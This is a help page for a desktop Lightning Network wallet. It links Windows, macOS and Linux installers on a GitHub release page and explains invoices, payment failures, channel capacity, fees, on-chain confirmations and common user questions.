<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Sending and receiving Lightning payments in Lightning Pay Wallet
Paste an invoice to pay, show your own invoice to be paid, and give the payment a moment to settle.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**
Sending a Lightning payment in Lightning Pay Wallet means pasting the invoice you were given and confirming the amount. Receiving means creating an invoice in the wallet and passing it to the payer. Both settle in seconds when a route exists, and both can fail when one does not; this page covers what each failure means and what to do about it.

## What a Lightning invoice is

A Lightning invoice is a one-use payment request that carries the amount, a payment hash and the destination, encoded as a long string that begins with `lnbc`. It is not a bitcoin address and it cannot receive an on-chain transaction; it is a request routed across the Lightning Network to a specific node.

Invoices expire. If a payer sends an old invoice, the payment fails before any money moves, which is why "this invoice has expired" is a normal message and not a sign of theft. If you are paying, take a fresh invoice from the person or service you are paying rather than reusing one from a chat history.

## How to pay with Lightning

To pay, open the send screen, paste the invoice, check the amount and the description the wallet decodes from it, and confirm. The payment either settles in seconds or reports a failure with a reason; there is no middle state a user can act on.

Three details are worth checking before you confirm. The amount is fixed by the invoice, so an invoice for more than you expect is a reason to stop. The description comes from the payer's request and is the only context the wallet can show you. And a payment that reports success is final; Lightning has no chargeback, so a wrong payment is a conversation with the recipient, not a reversal.

## How to receive Bitcoin

To receive, create an invoice in the wallet for the amount you expect, then give that invoice to the payer. When the payment arrives, the balance updates and the transaction appears in the history with the amount and the time.

Receiving needs somewhere for the payment to land. If your wallet has no channel with inbound capacity, a payer cannot route to you, and the payment fails on their side with a routing error rather than on yours. This is the single most confusing part of Lightning for a new user: a wallet with no balance and no channel can send nothing and receive nothing, and it looks identical to a wallet that is working.

## Why a Lightning payment fails

A failed Lightning payment is a routing failure, not a wallet failure. The network could not find a path from the payer to you with enough capacity, the invoice had expired, or one of the nodes on the only available path was offline. The wallet reports the failure; it cannot conjure a route that the network does not have.

The fix that resolves most of these is not a setting. Install the current release, because routing behaviour, fee estimation and channel handling change with every release, and a build two versions old will fail on paths a current one takes.

[the current release](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1)

Beyond that: ask the recipient for a fresh invoice, check that your node has an open channel with outbound capacity if you are paying, and try a smaller amount if a large one fails repeatedly. A payment that fails at every size on a healthy connection points at the counterparty, not at you.

## Can a stuck Lightning payment be cancelled?

No. A Lightning payment that has been sent cannot be cancelled by the sender, and there is no button, setting or support request that recalls it. The protocol is built so that a payment either completes or fails back on its own; a payment that appears stuck is waiting for the network to resolve it, not for you to intervene.

That surprises people: a card payment feels cancellable by calling the bank. Lightning is not. The practical advice is to keep the wallet open and online so the handshake can complete, and check the history rather than the spinner.

## Channels and who manages them

A Lightning channel is a funded connection between two nodes that lets them exchange payments without touching the chain. Every Lightning payment travels through channels, which is why capacity decides what you can send and receive. The wallet's role in that, and what you hold yourself, is covered in [self-custody: what you hold](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-self-custody.md).

In Lightning Pay Wallet you do not run a node or manage channels by hand. The wallet handles channel opening and closing for you, which is the trade that makes a desktop wallet usable: you give up the control a node operator has, and you get a wallet that receives a payment without a command line. Wallets that manage channels on your behalf work the same way, and the questions about who opens and closes a channel have the same answer: the software does, on your instruction.

## Channel capacity, limits and minimums

Channel capacity sets the ceiling on a single payment, and inbound capacity sets the ceiling on what you can receive. A wallet can hold a balance and still be unable to send it if all of it sits on the wrong side of a channel.

Two user-visible consequences follow. A payment larger than your outbound capacity fails even when the balance covers it. And a wallet may refuse to empty completely, because closing a channel costs an on-chain fee and the wallet keeps enough behind to pay it; a balance that will not go to zero is a reserve, not a bug.

## What a channel costs

Opening or closing a channel is an on-chain transaction, so it pays an on-chain fee, set by block space rather than by the wallet. A Lightning payment inside an open channel pays routing fees instead, usually a fraction of a satoshi.

A wallet that opens a channel to accept a payment pays for the opening, which is why the first receive costs more. [what a Lightning payment costs](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-fees-cost-of-a-lightning-payment.md) sets the two kinds of cost side by side.

## On-chain payments that stay pending

An on-chain bitcoin transaction is pending while it waits for a block, and block times are a network property, not a wallet setting. A transaction with a low fee can wait hours or days; a transaction with an adequate fee usually confirms within a few blocks.

You cannot cancel an on-chain transaction once it is broadcast. What you can do is wait for confirmation, or, in wallets that support it, replace the transaction with one that pays a higher fee. If a transaction has been unconfirmed for days, check a block explorer before assuming the wallet lost it: the transaction exists on the network whether or not the interface has caught up.

## Moving bitcoin to and from an exchange

Sending from Lightning Pay Wallet to an exchange works when you use the deposit method the exchange gives you: an on-chain address for an on-chain deposit, a Lightning invoice for a Lightning deposit. Sending a Lightning payment to an on-chain address, or the reverse, fails and can lose the funds if the receiving service does not support the network you used.

Cashing out follows the same rule in reverse. The exchange or custodial app sets the withdrawal details, and the wallet receives them like any other payment. Where a withdrawal fails, the reason is almost always on the sending side: an unsupported network, a deposit method that needs a memo, or an account restriction that has nothing to do with the wallet.

## After weeks of inactivity

A wallet that has been closed for weeks is fine: keys and channels do not expire, and opening it again resumes where it stopped. What can change in the meantime is the network's view of your channels, so the first launch after a long break may take longer to sync before the balance is accurate.

The precaution is the one that applies every day: keep the recovery phrase, and keep the channel backup if the wallet produces one. Time offline does not lose funds; losing the backup does.

## Questions people ask

### Why does my balance show zero after a payment arrived?

Either the wallet has not finished syncing, or the payment landed in a channel the interface has not refreshed. Give the sync a minute, then reopen the wallet. A balance that stays at zero after a completed sync is a support question, not something to fix by reinstalling.

### Is there a limit to how much I can send in one payment?

Yes: the outbound capacity of your channels, and any limit the receiving side sets. A payment above your capacity fails no matter how large your balance is, which is why a large balance and a failed payment can both be true at once.

### Can I send to someone who only has an on-chain address?

Not over Lightning. An on-chain address needs an on-chain transaction, and the wallet handles both, so use the on-chain send for that address and the Lightning send for an invoice. The two are not interchangeable and the mistake is not reversible.

### Do I pay a fee to receive?

Not to the wallet. A receive can still cost you indirectly, because a wallet that must open a channel to accept the payment pays the on-chain fee for opening it.
